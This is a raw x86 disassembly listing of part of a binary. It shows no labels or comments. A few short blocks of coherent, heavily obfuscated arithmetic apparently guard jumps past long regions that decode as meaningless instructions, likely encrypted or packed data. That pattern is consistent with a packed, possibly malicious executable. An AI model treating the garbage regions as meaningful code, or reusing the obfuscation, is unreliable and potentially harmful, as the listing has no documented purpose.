  40ed4d:	jne    0x40f1dc
  40ed53:	cmp    esi,edx
  40ed55:	jne    0x40f1dc
  40ed5b:	mov    eax,DWORD PTR [ebp-0xa4]
  40ed61:	mov    ecx,DWORD PTR [ebp-0xc]
  40ed64:	add    eax,0x80ca
  40ed69:	or     eax,ecx
  40ed6b:	mov    ecx,DWORD PTR ds:0x4227c4
  40ed71:	or     eax,0x686
  40ed76:	xor    eax,0x3eec
  40ed7b:	lea    eax,[eax+ecx*1-0xc11b]
  40ed82:	xor    DWORD PTR ds:0x4227bc,eax
  40ed88:	mov    eax,DWORD PTR [ebp-0x64]
  40ed8b:	and    eax,0x4dff
  40ed90:	add    eax,DWORD PTR [ebp-0x14]
  40ed93:	mov    ecx,DWORD PTR [ebp-0x94]
  40ed99:	xor    eax,0x676c
  40ed9e:	xor    edx,edx
  40eda0:	div    ecx
  40eda2:	mov    ecx,DWORD PTR [ebp-0x24]
  40eda5:	mov    edx,DWORD PTR [ebp-0x74]
  40eda8:	xor    ecx,0x6e1e
  40edae:	imul   ecx,edx
  40edb1:	mov    edx,DWORD PTR [ebp+0x8]
  40edb4:	push   0x4
  40edb6:	push   0xe4c37b20
  40edbb:	xor    eax,0x3884
  40edc0:	mov    eax,DWORD PTR [eax+edx*1]
  40edc3:	lea    ecx,[eax+ecx*1-0x27c6df8a]
  40edca:	mov    eax,DWORD PTR [ebp-0x34]
  40edcd:	mov    edx,DWORD PTR [ebp-0xb4]
  40edd3:	lea    eax,[edx+eax*1-0x76d2]
  40edda:	mov    edx,DWORD PTR [ebp-0x44]
  40eddd:	mov    esi,DWORD PTR [ebp-0x84]
  40ede3:	or     eax,edx
  40ede5:	xor    edx,edx
  40ede7:	div    esi
  40ede9:	mov    edx,DWORD PTR [ebp-0x54]
  40edec:	add    eax,0x43d7
  40edf1:	xor    eax,0x5e6a
  40edf6:	add    eax,DWORD PTR [edx+ecx*1]
  40edf9:	mov    ecx,DWORD PTR ds:0x4227bc
  40edff:	add    DWORD PTR [eax],ecx
  40ee01:	mov    eax,DWORD PTR [ebp-0x90]
  40ee07:	mov    ecx,DWORD PTR [ebp-0x8c]
  40ee0d:	mov    edx,DWORD PTR [ebp-0xa0]
  40ee13:	mov    esi,DWORD PTR [ebp-0x9c]
  40ee19:	sub    edx,eax
  40ee1b:	mov    eax,DWORD PTR [ebp-0xb0]
  40ee21:	sbb    esi,ecx
  40ee23:	mov    ecx,DWORD PTR [ebp-0xac]
  40ee29:	xor    edx,eax
  40ee2b:	mov    eax,DWORD PTR [ebp-0xc0]
  40ee31:	xor    esi,ecx
  40ee33:	mov    ecx,DWORD PTR [ebp-0xbc]
  40ee39:	add    edx,eax
  40ee3b:	adc    esi,ecx
  40ee3d:	add    edx,0x2313
  40ee43:	adc    esi,0x2a00
  40ee49:	push   esi
  40ee4a:	push   edx
  40ee4b:	call   0x4222a7
  40ee50:	mov    ecx,0x1207
  40ee55:	sub    ecx,eax
  40ee57:	push   0x0
  40ee59:	pop    eax
  40ee5a:	sbb    eax,edx
  40ee5c:	mov    edx,DWORD PTR ds:0x4227bc
  40ee62:	xor    esi,esi
  40ee64:	jmp    0x40f1a7
  40ee69:	mov    bh,0x51
  40ee6b:	lods   eax,DWORD PTR ds:[esi]
  40ee6c:	xchg   edi,eax
  40ee6d:	mov    ebx,0x8571b7bb
  40ee72:	pop    ecx
  40ee73:	xor    ch,bl
  40ee75:	sbb    al,0x1a
  40ee77:	pushf  
  40ee78:	jecxz  0x40ee67
  40ee7a:	adc    bh,BYTE PTR [esi-0x413bfe42]
  40ee80:	mov    esi,0x922e07de
  40ee85:	xchg   ebx,eax
  40ee86:	aad    0x4a
  40ee88:	loope  0x40ee95
  40ee8a:	mov    eax,0x4d20a6ef
  40ee8f:	call   0xeeee:0x1e9fd4ce
  40ee96:	jno    0x40eed2
  40ee98:	fdiv   st(5),st
  40ee9a:	imul   edx,DWORD PTR [ebx+esi*8],0x7b8c2a2c
  40eea1:	int3   
  40eea2:	and    bh,cl
  40eea4:	adc    dl,BYTE PTR [edi-0x2c]
  40eea7:	adc    al,0x1b
  40eea9:	add    DWORD PTR [ebp+0x3b],edi
  40eeac:	fs loopne 0x40ef09
  40eeaf:	fs xchg esp,eax
  40eeb1:	cmp    edi,esp
  40eeb3:	add    eax,0x6631f17e
  40eeb8:	push   eax
  40eeb9:	xchg   ecx,eax
  40eeba:	inc    ecx
  40eebb:	pop    ss
  40eebc:	popf   
  40eebd:	test   esp,0x104dfb4a
  40eec3:	ins    BYTE PTR es:[edi],dx
  40eec4:	in     al,0x87
  40eec6:	fmul   DWORD PTR [esi+edx*8]
  40eec9:	inc    ebx
  40eeca:	mov    ecx,0xc00e0d92
  40eecf:	or     al,0x9d
  40eed1:	mov    ds:0x263272f2,eax
  40eed6:	or     ebp,DWORD PTR [ebx+0x602e08]
  40eedc:	pop    ss
  40eedd:	pushf  
  40eede:	dec    eax
  40eedf:	cmp    al,0x65
  40eee1:	and    BYTE PTR [esi],bl
  40eee3:	call   0xa4c0e1ab
  40eee8:	inc    ebx
  40eee9:	xor    eax,0xd8e5ad43
  40eeee:	and    ecx,DWORD PTR [ecx]
  40eef0:	xor    al,0x35
  40eef2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40eef3:	mov    edx,0x42cfe7d
  40eef8:	fcom   QWORD PTR [edi+0x2c91c6e5]
  40eefe:	retf   0x7acf
  40ef01:	(bad)  
  40ef02:	call   0xd3093db1
  40ef07:	(bad)  
  40ef09:	mul    dl
  40ef0b:	and    al,0xe3
  40ef0d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ef0e:	lods   eax,DWORD PTR ds:[esi]
  40ef0f:	sar    DWORD PTR [ebp+0x3fe8fb19],cl
  40ef15:	sbb    eax,0x24a7b8a5
  40ef1a:	mov    ebp,0x689cc7ad
  40ef1f:	sbb    eax,0xda233bc2
  40ef24:	mov    al,ds:0x97e2a472
  40ef29:	sub    ebp,DWORD PTR [edi+0x64]
  40ef2c:	mov    ds:0x4fca2f43,al
  40ef31:	dec    ecx
  40ef32:	cs pop ss
  40ef34:	fist   WORD PTR [eax-0x2c]
  40ef37:	(bad)  
  40ef38:	gs and eax,0x2d02ee0b
  40ef3e:	test   al,0x7b
  40ef40:	ins    BYTE PTR es:[edi],dx
  40ef41:	sub    ch,BYTE PTR [ebx+ebx*8-0x21]
  40ef45:	mov    ds:0xc840c4b,eax
  40ef4a:	aad    0x74
  40ef4c:	repz dec ebx
  40ef4e:	(bad)  
  40ef4f:	push   ebx
  40ef50:	popa   
  40ef51:	ja     0x40ef0f
  40ef53:	imul   ebx,DWORD PTR [esi+ebp*2+0x61],0x6fd3f820
  40ef5b:	repz adc DWORD PTR [esi],esi
  40ef5e:	and    ebx,DWORD PTR [ebx]
  40ef60:	mov    bl,0xc2
  40ef62:	stos   BYTE PTR es:[edi],al
  40ef63:	int3   
  40ef64:	sub    eax,0x4dd23e54
  40ef69:	call   DWORD PTR [edi]
  40ef6b:	cmp    al,0xd9
  40ef6d:	xor    DWORD PTR [ebp-0x22],edi
  40ef70:	sar    BYTE PTR [edx-0x38e8acb2],0xcc
  40ef77:	cmc    
  40ef78:	inc    eax
  40ef79:	push   ebp
  40ef7a:	rcr    DWORD PTR [eax+0x4d],1
  40ef7d:	icebp  
  40ef7e:	mov    edx,0xc465e83c
  40ef83:	jmp    0x40efca
  40ef85:	mov    BYTE PTR [edx-0x5e],ah
  40ef88:	cmc    
  40ef89:	dec    edx
  40ef8a:	dec    esp
  40ef8b:	inc    DWORD PTR [edi+eiz*1+0x66]
  40ef8f:	pop    ebp
  40ef90:	jmp    0xca333a8b
  40ef95:	adc    bl,BYTE PTR [edi]
  40ef97:	sti    
  40ef98:	outs   dx,DWORD PTR ds:[esi]
  40ef99:	mov    bh,0xab
  40ef9b:	mov    fs,ecx
  40ef9d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ef9e:	out    0x51,al
  40efa0:	inc    ecx
  40efa1:	clc    
  40efa2:	xchg   esp,eax
  40efa3:	sub    eax,esp
  40efa5:	xor    edx,DWORD PTR [esi+eiz*8+0x4e]
  40efa9:	and    esp,ebx
  40efab:	mov    edi,0x2258ab3b
  40efb0:	nop
  40efb1:	inc    ecx
  40efb2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40efb3:	sbb    ecx,DWORD PTR [eax+0x2e117dd9]
  40efb9:	add    esp,DWORD PTR [ecx]
  40efbb:	inc    ebp
  40efbc:	je     0x40f000
  40efbe:	inc    esi
  40efbf:	imul   ebp,DWORD PTR [eax+0x4b],0x3d
  40efc3:	dec    esi
  40efc4:	stc    
  40efc5:	add    esp,edi
  40efc7:	outs   dx,BYTE PTR ds:[esi]
  40efc8:	sub    al,0x48
  40efca:	dec    edx
  40efcb:	add    eax,DWORD PTR [esi]
  40efcd:	jo     0x40ef56
  40efcf:	dec    ecx
  40efd0:	or     ecx,DWORD PTR [eax]
  40efd2:	add    cl,ch
  40efd4:	jbe    0x40efc7
  40efd6:	std    
  40efd7:	outs   dx,DWORD PTR ds:[esi]
  40efd8:	ins    DWORD PTR es:[edi],dx
  40efd9:	fmulp  st(7),st
  40efdb:	rcr    BYTE PTR [ebp-0x7a76a1c5],0x1a
  40efe2:	add    DWORD PTR [edi],ecx
  40efe4:	xchg   edi,eax
  40efe5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40efe6:	mov    bh,0x2d
  40efe8:	xor    dh,BYTE PTR [edi+0x724ff723]
  40efee:	fnstsw WORD PTR [esi+eax*2]
  40eff1:	add    eax,0x2106b60c
  40eff6:	push   ebp
  40eff7:	ja     0x40f015
  40eff9:	sbb    BYTE PTR [ebx-0x66],bh
  40effc:	test   DWORD PTR [edi-0x7f32e5b2],ebx
  40f002:	add    DWORD PTR [ebx+ebp*4-0x67c16fa6],ecx
  40f009:	fiadd  DWORD PTR [edi]
  40f00b:	mov    ecx,0x4f1c9b24
  40f010:	mov    esp,0x6b8fc29
  40f015:	leave  
  40f016:	adc    ch,dl
  40f018:	das    
  40f019:	cdq    
  40f01a:	mov    cl,0x9d
  40f01c:	out    0xa0,eax
  40f01e:	push   ds
  40f01f:	push   0x1617b590
  40f024:	vpcomw xmm4,xmm7,XMMWORD PTR [edi-0x55b2fcc8],0xb3
  40f02e:	dec    esi
  40f02f:	inc    ebp
  40f030:	loop   0x40eff0
  40f032:	inc    edx
  40f033:	and    DWORD PTR [eax],esp
  40f035:	out    0x1d,al
  40f037:	sbb    BYTE PTR [ecx],al
  40f039:	outs   dx,BYTE PTR ds:[esi]
  40f03a:	mov    ebx,0xe5db1dfe
  40f03f:	push   eax
  40f040:	fdecstp 
  40f042:	jle    0x40f048
  40f044:	sbb    BYTE PTR [edx-0x61],al
  40f047:	pop    ebp
  40f048:	mov    bl,0xd7
  40f04a:	push   ecx
  40f04b:	les    esi,FWORD PTR [ebp-0x6d]
  40f04e:	xchg   edx,eax
  40f04f:	add    BYTE PTR [edi],0xb1
  40f052:	(bad)
  40f055:	sti    
  40f056:	jbe    0x40f003
  40f058:	iret   
  40f059:	and    ebp,edi
  40f05b:	ror    DWORD PTR [esi],1
  40f05d:	dec    edi
  40f05e:	mov    ah,0xdf
  40f061:	inc    ecx
  40f062:	push   eax
  40f063:	jp     0x40f05e
  40f065:	xor    BYTE PTR [ebx-0x2d],0x9e
  40f069:	pop    ss
  40f06a:	std    
  40f06b:	neg    BYTE PTR [edi-0x6eda9afd]
  40f071:	mov    BYTE PTR [edi],dh
  40f073:	jo     0x40f030
  40f075:	cwde   
  40f076:	sahf   
  40f077:	mov    cl,0xf7
  40f079:	rcl    DWORD PTR [ebp-0x5c],cl
  40f07c:	jecxz  0x40f0ce
  40f07e:	fnstsw WORD PTR [ebp+0x1857fdd2]
  40f084:	push   0xffffffa2
  40f086:	inc    ebx
  40f087:	pop    ecx
  40f088:	fld    DWORD PTR [edi-0x7d4c7e5a]
  40f08e:	out    dx,al
  40f08f:	mov    dl,0xea
  40f091:	das    
  40f092:	fwait
  40f093:	stos   DWORD PTR es:[edi],eax
  40f094:	pop    ebp
  40f095:	mov    ds:0x29ebcb2e,eax
  40f09a:	sahf   
  40f09b:	outs   dx,BYTE PTR ds:[esi]
  40f09c:	mov    ah,BYTE PTR [edi+edx*8+0x61a6f4ba]
  40f0a3:	mov    ebx,0x2a3fafca
  40f0a8:	and    eax,0x5d2e56ed
  40f0ad:	sti    
  40f0ae:	mov    ds,WORD PTR [edx]
  40f0b0:	fwait
  40f0b1:	adc    BYTE PTR [eax-0x75],dl
  40f0b4:	stos   DWORD PTR es:[edi],eax
  40f0b5:	(bad)  
  40f0b6:	add    eax,0xeb8862f0
  40f0bb:	jecxz  0x40f04b
  40f0bd:	ins    BYTE PTR es:[edi],dx
  40f0be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f0bf:	and    BYTE PTR [ecx-0xb],bl
  40f0c2:	pop    ecx
  40f0c3:	pop    eax
  40f0c4:	inc    ecx
  40f0c5:	retf   
  40f0c6:	adc    dl,ah
  40f0c8:	push   ds
  40f0c9:	aas    
  40f0ca:	push   0x45
  40f0cc:	ins    DWORD PTR es:[edi],dx
  40f0cd:	mov    ds:0xf36624e6,al
  40f0d2:	std    
  40f0d3:	aam    0x3c
  40f0d5:	jns    0x40f134
  40f0d7:	push   cs
  40f0d8:	repnz mov ebx,0x5c02bca0
  40f0de:	call   0x84ba:0x70de6456
  40f0e5:	cmc    
  40f0e6:	mov    ebx,0x8c196145
  40f0eb:	jns    0x40f06d
  40f0ed:	pop    ds
  40f0ee:	or     BYTE PTR [esp+ecx*1-0x14],0x4e
  40f0f3:	sub    DWORD PTR [edi],edi
  40f0f5:	xor    bl,BYTE PTR [ebx+0x542d221d]
  40f0fb:	leave  
  40f0fc:	lods   eax,DWORD PTR ds:[esi]
  40f0fd:	nop
  40f0fe:	mov    ss,WORD PTR [edx+0x37b41b18]
  40f104:	or     ebp,DWORD PTR [ecx]
  40f106:	es cmc 
  40f108:	jae    0x40f0ef
  40f10a:	pop    esp
  40f10b:	scas   eax,DWORD PTR es:[edi]
  40f10c:	mov    ds:0xef9ff734,al
  40f111:	xor    esi,DWORD PTR [esi+esi*8-0x230d2d83]
  40f118:	mov    ah,0x26
  40f11a:	or     al,dl
  40f11c:	jb     0x40f143
  40f11e:	rol    al,0x88
  40f121:	push   edx
  40f122:	sub    eax,0x6e740725
  40f127:	cdq    
  40f128:	add    bl,dl
  40f12a:	sub    ebp,DWORD PTR [ebx+ebx*4]
  40f12d:	or     esi,ecx
  40f12f:	iret   
  40f130:	outs   dx,DWORD PTR ds:[esi]
  40f131:	push   esp
  40f132:	cmp    ah,BYTE PTR [edx+0x69311c20]
  40f138:	xor    DWORD PTR [ebx-0x26],ecx
  40f13b:	jne    0x40f10b
  40f13d:	mov    eax,0xde56f169
  40f142:	loopne 0x40f170
  40f144:	mov    DWORD PTR [esi-0x1558246a],edx
  40f14a:	xchg   bl,ah
  40f14c:	push   0x4ceaaf7f
  40f151:	xor    esi,DWORD PTR [esp+edi*2+0x79]
  40f155:	inc    ebp
  40f156:	xchg   ebx,eax
  40f157:	ja     0x40f19c
  40f159:	mov    bh,0x1b
  40f15b:	(bad)  
  40f15c:	in     al,dx
  40f15d:	add    al,0x2f
  40f15f:	cmp    esi,DWORD PTR [esi-0x67]
  40f162:	aad    0x5a
  40f164:	call   0xdb6e1b8b
  40f169:	pop    eax
  40f16a:	xlat   BYTE PTR ds:[ebx]
  40f16b:	pop    ss
  40f16c:	cmp    eax,0xcb35dd48
  40f171:	pop    esi
  40f172:	je     0x40f13f
  40f174:	pushf  
  40f175:	lods   al,BYTE PTR ds:[esi]
  40f176:	jo     0x40f159
  40f178:	(bad)  [ebx+0x1974a16d]
  40f17e:	xor    eax,DWORD PTR [ecx]
  40f180:	pop    ss
  40f181:	outs   dx,DWORD PTR ds:[esi]
  40f182:	jecxz  0x40f182
  40f184:	jne    0x40f15b
  40f186:	mov    edi,0x97596973
  40f18b:	sub    DWORD PTR [edx],edx
  40f18d:	sbb    DWORD PTR [esi+eiz*2],ebp
  40f190:	shl    BYTE PTR [edx-0x79fe3365],cl
  40f196:	push   edi
  40f197:	lock jp 0x40f1e6
  40f19a:	jecxz  0x40f1a9
  40f19c:	xor    eax,0x869b885d
  40f1a1:	add    eax,0xf64b4c00
  40f1a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f1a7:	cmp    edx,ecx
  40f1a9:	jne    0x40f1dc
  40f1af:	cmp    esi,eax
  40f1b1:	jne    0x40f1dc
  40f1b7:	mov    eax,DWORD PTR [ebp-0x4]
  40f1ba:	mov    ecx,DWORD PTR [ebp-0x8]
  40f1bd:	add    eax,0x4296
  40f1c2:	shr    eax,0x2
  40f1c5:	or     eax,ecx
  40f1c7:	mov    ecx,DWORD PTR [ebp-0x10]
  40f1ca:	xor    eax,ecx
  40f1cc:	xor    eax,0x4e94
  40f1d1:	add    eax,DWORD PTR ds:0x4227bc
  40f1d7:	mov    ds:0x4227c4,eax
  40f1dc:	pop    esi
  40f1dd:	leave  
  40f1de:	ret    0x4
  40f1e1:	push   ebp
  40f1e2:	mov    ebp,esp
  40f1e4:	sub    esp,0x58
  40f1e7:	push   ebx
  40f1e8:	push   esi
  40f1e9:	jmp    0x40f59d
  40f1ee:	jne    0x40f25e
  40f1f0:	mov    ds:0xb73caafc,al
  40f1f5:	je     0x40f1e5
  40f1f7:	fsubr  QWORD PTR [ecx+edx*8-0x77]
  40f1fb:	(bad)  
  40f1fc:	xor    al,0xdd
  40f1fe:	xor    DWORD PTR [eax],ebx
  40f200:	mov    esi,0xbec4e3be
  40f205:	mov    esi,0x8c92d925
  40f20a:	push   0xffffffa2
  40f20c:	fsub   DWORD PTR [esp+ebx*2]
  40f20f:	mov    edi,0x89b46088
  40f214:	and    esi,DWORD PTR ds:0xef5bd076
  40f21a:	int    0xdd
  40f21c:	aaa    
  40f21d:	jge    0x40f26a
  40f21f:	iret   
  40f220:	and    al,ah
  40f222:	lahf   
  40f223:	dec    ecx
  40f224:	push   edx
  40f225:	xchg   ebx,eax
  40f226:	icebp  
  40f227:	dec    esp
  40f228:	iret   
  40f229:	or     edi,edx
  40f22b:	add    BYTE PTR [ebp-0x58],ch
  40f22e:	xor    cl,BYTE PTR fs:[esi+0x6862de46]
  40f235:	adc    eax,0xea06c2f4
  40f23a:	mov    eax,ds:0xf249999d
  40f23f:	mov    al,ds:0x290c9674
  40f244:	push   ebp
  40f245:	call   0x5879:0x185a0dd5
  40f24c:	xor    al,0xce
  40f24e:	jne    0x40f204
  40f250:	ins    BYTE PTR es:[edi],dx
  40f251:	and    ch,BYTE PTR [eax-0x80]
  40f254:	add    ebp,eax
  40f256:	(bad)  
  40f258:	sub    bl,BYTE PTR ss:[esi]
  40f25b:	adc    DWORD PTR [ebx],edx
  40f25d:	lea    edx,[ebp+esi*2-0x47]
  40f261:	and    al,0x14
  40f263:	cld    
  40f264:	fdivr  DWORD PTR [eax-0x63c76092]
  40f26a:	inc    ebx
  40f26b:	mov    DWORD PTR [ebp-0x5ee7489b],ebp
  40f271:	cmp    DWORD PTR [edi],esi
  40f273:	fstp   DWORD PTR [esi+esi*4-0x22308e73]
  40f27a:	mov    al,ds:0xce170366
  40f27f:	pop    eax
  40f280:	pop    es
  40f281:	addr16 mov esp,0xcee7626e
  40f287:	rol    BYTE PTR [esi-0x6f],cl
  40f28a:	jo     0x40f2e0
  40f28c:	pop    eax
  40f28d:	fldcw  WORD PTR [ebp+0x6d93b79]
  40f293:	cdq    
  40f294:	cdq    
  40f295:	int    0x7a
  40f297:	xchg   edi,eax
  40f298:	push   0xffffff9f
  40f29a:	mov    ebx,0x5ecb88e5
  40f29f:	sub    ebx,esi
  40f2a1:	xlat   BYTE PTR ds:[ebx]
  40f2a2:	in     eax,0x4f
  40f2a4:	test   al,0x95
  40f2a6:	inc    ecx
  40f2a7:	pop    ecx
  40f2a8:	ins    BYTE PTR es:[edi],dx
  40f2a9:	push   ebp
  40f2aa:	lods   al,BYTE PTR ds:[esi]
  40f2ab:	lahf   
  40f2ac:	push   0xe696e18d
  40f2b1:	(bad)  
  40f2b3:	add    bh,al
  40f2b5:	mov    bh,0x9c
  40f2b7:	push   cs
  40f2b8:	or     eax,DWORD PTR [eax]
  40f2ba:	stos   DWORD PTR es:[edi],eax
  40f2bb:	pop    ebp
  40f2bc:	das    
  40f2bd:	imul   edi,DWORD PTR [esp+edx*2+0x432a7acc],0xe76bd50e
  40f2c8:	or     BYTE PTR [esi+0x28],al
  40f2cb:	call   0xfb89:0xfd46dfe9
  40f2d2:	mov    ds:0xca2e91f5,al
  40f2d7:	pop    esi
  40f2d8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f2d9:	loope  0x40f2ba
  40f2db:	ins    BYTE PTR es:[edi],dx
  40f2dc:	jne    0x40f2d2
  40f2de:	(bad)  [ebx]
  40f2e0:	pop    ebx
  40f2e1:	push   bp
  40f2e3:	mov    eax,ds:0xb2400e0c
  40f2e8:	das    
  40f2e9:	out    dx,al
  40f2ea:	cmp    ecx,DWORD PTR [ecx]
  40f2ec:	loopne 0x40f2d5
  40f2ee:	fidivr DWORD PTR ds:0x5929741f
  40f2f4:	jbe    0x40f27f
  40f2f6:	shr    BYTE PTR [ebp+0x465a776c],cl
  40f2fc:	stc    
  40f2fd:	test   al,0xbe
  40f2ff:	add    DWORD PTR [esi+0x232070aa],ecx
  40f305:	jb     0x40f362
  40f307:	inc    ebp
  40f308:	into   
  40f309:	push   edi
  40f30a:	adc    BYTE PTR [eax+ebp*1],bl
  40f30d:	pop    ebp
  40f30e:	xchg   esp,eax
  40f30f:	mov    cl,0x28
  40f311:	and    eax,0x2af43341
  40f316:	pop    eax
  40f317:	enter  0x7c08,0x0
  40f31b:	cld    
  40f31c:	mov    ?,eax
  40f31e:	sub    al,0x6b
  40f320:	loopne 0x40f2bf
  40f322:	lods   al,BYTE PTR ds:[esi]
  40f323:	add    BYTE PTR [ebx+0x1],dh
  40f326:	repnz inc esi
  40f328:	add    BYTE PTR [eax-0x31],ah
  40f32b:	inc    esi
  40f32c:	pop    edx
  40f32d:	xchg   ebp,eax
  40f32e:	idiv   BYTE PTR [eax]
  40f330:	retf   0xa432
  40f333:	fwait
  40f334:	ss (bad) 
  40f336:	mov    ds:0x32b88fcb,al
  40f33b:	sbb    al,0x87
  40f33d:	pop    esp
  40f33e:	cli    
  40f33f:	cld    
  40f340:	dec    ebx
  40f341:	adc    eax,0x6de531a2
  40f346:	lods   eax,DWORD PTR ds:[esi]
  40f347:	icebp  
  40f348:	push   edi
  40f349:	es mov ah,0xdf
  40f34c:	je     0x40f2f0
  40f34e:	int    0x77
  40f350:	lea    edi,[edx]
  40f352:	jno    0x40f36e
  40f354:	xchg   ecx,eax
  40f355:	sti    
  40f356:	out    0x76,eax
  40f358:	sar    DWORD PTR [eax-0x34],0x46
  40f35c:	stc    
  40f35d:	cmp    esi,DWORD PTR [edx-0x3c82b58a]
  40f363:	fisubr WORD PTR [esi-0x34]
  40f366:	daa    
  40f367:	test   al,0x63
  40f369:	dec    ebp
  40f36a:	adc    al,0xe7
  40f36c:	pop    es
  40f36d:	mov    cl,BYTE PTR [edi+0x2f]
  40f370:	int3   
  40f371:	mov    al,BYTE PTR [ecx-0x20f27390]
  40f377:	test   eax,0x5aab4e3e
  40f37c:	dec    edi
  40f37d:	addr16 adc eax,0xde8fbfb4
  40f383:	or     ch,al
  40f385:	sbb    ebp,DWORD PTR [ebx]
  40f387:	xchg   edx,eax
  40f388:	in     eax,dx
  40f389:	add    eax,0xb1fdc03e
  40f38e:	xchg   esi,eax
  40f38f:	xchg   esi,eax
  40f390:	enter  0x42d2,0x1a
  40f394:	test   eax,0x6223a69e
  40f399:	inc    eax
  40f39a:	in     eax,0xa0
  40f39c:	xor    BYTE PTR [edi-0x27],ch
  40f39f:	push   ebx
  40f3a0:	sbb    DWORD PTR [esi-0x3797db1],ecx
  40f3a6:	push   edx
  40f3a7:	sti    
  40f3a8:	inc    edi
  40f3a9:	out    0xbc,eax
  40f3ab:	int3   
  40f3ac:	out    dx,al
  40f3ad:	popa   
  40f3ae:	sub    bl,BYTE PTR [ebx]
  40f3b0:	dec    esp
  40f3b1:	retf   
  40f3b2:	cli    
  40f3b3:	fmulp  st(2),st
  40f3b5:	mov    bl,0xf
  40f3b7:	xchg   edi,eax
  40f3b8:	call   0x619ed81f
  40f3bd:	fs cmp eax,0x9f192082
  40f3c3:	scas   al,BYTE PTR es:[edi]
  40f3c4:	mov    eax,0xdd14f8f5
  40f3c9:	sub    DWORD PTR [edx-0x41221eee],eax
  40f3cf:	or     bl,dl
  40f3d1:	icebp  
  40f3d2:	inc    edx
  40f3d3:	sub    eax,0xc21d3573
  40f3d8:	dec    ebx
  40f3d9:	cwd    
  40f3db:	push   es
  40f3dc:	std    
  40f3dd:	rol    DWORD PTR [ecx+eax*1],1
  40f3e0:	cmp    eax,0x1b59ee00
  40f3e5:	push   ebp
  40f3e6:	ins    DWORD PTR es:[edi],dx
  40f3e7:	jg     0x40f3f4
  40f3e9:	repz mov bl,BYTE PTR [ecx-0x517898dc]
  40f3f0:	pop    ebx
  40f3f1:	into   
  40f3f2:	sbb    BYTE PTR [ebx+0x3c],dh
  40f3f5:	scas   al,BYTE PTR es:[edi]
  40f3f6:	loope  0x40f3b7
  40f3f8:	(bad)  
  40f3f9:	loopne 0x40f40b
  40f3fb:	cs push ss
  40f3fd:	std    
  40f3fe:	mov    edi,0xfbfa8d4d
  40f403:	sbb    BYTE PTR [edi],0x62
  40f406:	dec    esi
  40f407:	nop
  40f408:	sbb    edi,eax
  40f40a:	jg     0x40f42e
  40f40c:	inc    esi
  40f40d:	daa    
  40f40e:	xchg   ebp,eax
  40f40f:	fiadd  WORD PTR [eax-0x7e]
  40f412:	or     al,0x1a
  40f414:	test   al,0x9f
  40f416:	shl    DWORD PTR [esi+0x20c62cf9],1
  40f41c:	mov    bl,0x17
  40f41e:	mov    dl,0x55
  40f420:	adc    eax,0x7eefe30a
  40f425:	pop    es
  40f426:	jnp    0x40f3c1
  40f428:	mov    ds:0x18c5d7a5,eax
  40f42d:	xchg   ebp,eax
  40f42e:	add    al,0xc6
  40f430:	dec    edi
  40f431:	test   ah,dh
  40f433:	pop    ss
  40f434:	pop    DWORD PTR [ecx-0x53]
  40f437:	lock in al,0xe5
  40f43a:	ja     0x40f427
  40f43c:	(bad)  
  40f43d:	cmovb  edi,DWORD PTR [ebx-0x37f26379]
  40f444:	push   esi
  40f445:	or     DWORD PTR [ecx+0x6414d040],edx
  40f44b:	xchg   DWORD PTR [eiz*4+0x3448ca57],ebx
  40f452:	xor    al,0x2f
  40f454:	add    BYTE PTR [edi],bl
  40f456:	jae    0x40f431
  40f458:	cmp    ch,BYTE PTR ds:0x5f10f7fa
  40f45e:	(bad)  [eax]
  40f460:	and    DWORD PTR [esi],ecx
  40f462:	push   edx
  40f463:	jp     0x40f4a0
  40f465:	inc    edi
  40f466:	leave  
  40f467:	imul   DWORD PTR [edi+0x57048350]
  40f46d:	in     al,0x8c
  40f46f:	retf   
  40f470:	cmp    BYTE PTR ds:0x29ee1803,ch
  40f476:	or     cl,BYTE PTR [edx]
  40f478:	fisub  WORD PTR [esi+0x32]
  40f47b:	cmp    edx,edx
  40f47d:	(bad)  
  40f47e:	loopne 0x40f42d
  40f480:	cmc    
  40f481:	pop    eax
  40f482:	cmp    al,0x6
  40f484:	inc    esi
  40f485:	push   0xffffffe0
  40f487:	scas   al,BYTE PTR es:[edi]
  40f488:	add    ebx,DWORD PTR [esi+0x2b]
  40f48b:	cmc    
  40f48c:	sti    
  40f48d:	sbb    ebx,DWORD PTR [esi]
  40f48f:	and    cl,BYTE PTR [ecx+ebp*8-0x29]
  40f493:	int3   
  40f494:	pop    esp
  40f495:	scas   al,BYTE PTR es:[edi]
  40f496:	sub    ecx,DWORD PTR [edx-0x29]
  40f499:	icebp  
  40f49a:	fimul  DWORD PTR [eax]
  40f49c:	out    0x18,al
  40f49e:	push   ss
  40f49f:	dec    ebx
  40f4a0:	mov    eax,0x2d289917
  40f4a5:	adc    eax,eax
  40f4a7:	adc    eax,esi
  40f4a9:	fistp  WORD PTR [edx]
  40f4ab:	fdiv   st(0),st
  40f4ad:	data16 adc BYTE PTR [eax+0x345baba4],ch
  40f4b4:	daa    
  40f4b5:	mov    bh,0x8a
  40f4b7:	out    dx,eax
  40f4b8:	lds    edx,FWORD PTR [ecx+0x53]
  40f4bb:	xchg   DWORD PTR [ebp-0x36],esi
  40f4be:	jnp    0x40f47a
  40f4c0:	xchg   DWORD PTR [edx+0x2c5de6e1],eax
  40f4c6:	inc    ebp
  40f4c7:	xchg   ecx,eax
  40f4c8:	push   ds
  40f4c9:	push   ecx
  40f4ca:	popf   
  40f4cb:	stos   DWORD PTR es:[edi],eax
  40f4cc:	inc    BYTE PTR [edi]
  40f4ce:	mov    bh,BYTE PTR [edi+0x1919c809]
  40f4d4:	mov    ecx,0x15661618
  40f4d9:	rol    DWORD PTR [ebx+0x665ab97b],1
  40f4df:	jns    0x40f4f9
  40f4e1:	push   0x21
  40f4e3:	ins    DWORD PTR es:[edi],dx
  40f4e4:	test   eax,0x9ad35714
  40f4e9:	ja     0x40f4e5
  40f4eb:	(bad)  
  40f4ed:	and    dh,bh
  40f4ef:	fiadd  WORD PTR [ecx]
  40f4f1:	(bad)
  40f4f5:	mov    esp,0xfeb77b5e
  40f4fa:	jne    0x40f577
  40f4fc:	leave  
  40f4fd:	add    eax,0x6d9e0800
  40f502:	adc    DWORD PTR [esi+0x44],eax
